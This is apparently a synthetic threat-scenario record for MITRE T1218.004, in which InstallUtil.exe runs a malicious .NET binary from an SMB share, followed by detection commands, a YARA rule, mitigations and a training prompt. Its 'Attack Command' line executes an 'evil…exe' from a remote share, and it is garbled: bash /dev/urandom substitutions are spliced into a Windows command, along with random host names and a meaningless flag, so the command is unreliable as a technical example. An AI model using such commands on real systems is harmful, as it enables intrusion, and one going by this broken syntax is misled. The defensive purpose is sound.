---
type: campaign
scenario_id: 245
tactic: Defense Evasion
technique: "T1218.004: InstallUtil"
technique_id: T1218.004
tags: [campaign, lotl, defense_evasion]
---

# Using InstallUtil.exe to execute malicious .NET binary via SMB share.

## Threat Description
Using InstallUtil.exe to execute malicious .NET binary via SMB share.

## Attack Command
```
InstallUtil /logfile= /LogToConsole=false /U \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor InstallUtil SMB: `wmic process where name='InstallUtil.exe' get commandline | findstr \\`; YARA rule: `rule InstallUtilSmb { strings: $a = /InstallUtil.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict InstallUtil: `icacls %windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect InstallUtil SMB execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
